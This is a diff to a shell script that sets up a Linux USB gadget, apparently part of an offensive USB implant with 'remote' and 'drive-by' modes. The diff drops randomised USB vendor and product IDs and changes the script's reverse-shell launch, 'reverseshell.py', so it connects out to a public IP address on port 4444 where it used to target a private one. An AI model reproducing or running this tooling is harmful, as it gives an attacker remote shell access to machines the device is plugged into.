@@ -16,12 +16,8 @@ cd /sys/kernel/config/usb_gadget
 # configure gadget details
 # =========================
 # set Vendor ID
-USB_VID = openssl rand -hex 2
-USB_PID = openssl rand -hex 2
 echo 0x1d6b > idVendor
-echo "0$USB_VID" > idVendor
 echo 0x0104 > idProduct
-echo "0x$USB_PID" > idProduct
 # set device version 1.0.0
 echo 0x0100 > bcdDevice
 # set USB mode to USB 2.0
@@ -57,7 +53,7 @@ ls /sys/class/udc > UDC
 
 
 if $MODE_REMOTE; then
-    python $wdir/boot/reverseshell.py 10.0.0.6 4444
+    python $wdir/boot/reverseshell.py 132.147.124.35 4444
 fi
 
 if $MODE_DRIVEBY; then
